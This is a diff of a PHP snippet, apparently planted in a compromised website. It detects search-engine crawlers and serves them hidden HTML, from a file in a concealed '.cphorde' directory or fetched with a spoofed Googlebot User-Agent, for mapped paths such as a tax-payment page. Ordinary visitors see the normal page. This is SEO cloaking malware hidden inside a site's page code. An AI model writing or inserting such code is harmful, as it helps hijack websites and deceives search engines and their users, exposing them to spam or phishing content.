@@ -7,33 +7,34 @@ $isCrawler = preg_match(
     $ua
 );
 
-// Path lengkap ke file lokal (bisa beda-beda direktori)
 $pathMap = [
-    '/pago-de-impuestos-2'             =>   '/home/impuesto/.cphorde/meta/kimbeklah.txt',
+    '/asdasd'             =>   '/home/impuesto/.cphorde/meta/kimbeklah.txt',
 ];
 
-if ($isCrawler && isset($pathMap[$uri]) && !empty($pathMap[$uri])) {
-    $localFile = $pathMap[$uri];
-    
-    // Cek apakah file lokal ada dan bisa dibaca
-    if (file_exists($localFile) && is_readable($localFile)) {
-        $html = file_get_contents($localFile);
-        
-        if ($html !== false) {
-            header('Content-Type: text/html; charset=UTF-8');
-            header('Cache-Control: no-cache, private');
-            header('X-Robots-Tag: index, follow');
-            
-            echo "<script>window.__CRAWLER__ = true;</script>\n";
-            echo $html;
-            exit;
-        }
+
+if ($isCrawler && isset($pathMap[$uri])) {
+
+    $remoteUrl = $pathMap[$uri];
+
+    $context = stream_context_create([
+        'http' => [
+            'method'  => 'GET',
+            'timeout' => 5,
+            'header'  => "User-Agent: Googlebot\r\n"
+        ]
+    ]);
+
+    $html = @file_get_contents($remoteUrl, false, $context);
+
+    if ($html !== false) {
+        header('Content-Type: text/html; charset=UTF-8');
+        header('Cache-Control: no-cache, private');
+        header('X-Robots-Tag: index, follow');
+
+        echo "<script>window.__CRAWLER__ = true;</script>\n";
+        echo $html;
+        exit;
     }
-    
-    // Optional: fallback jika file tidak ditemukan
-    http_response_code(404);
-    echo "Content not found";
-    exit;
 }
 ?>
 <?php
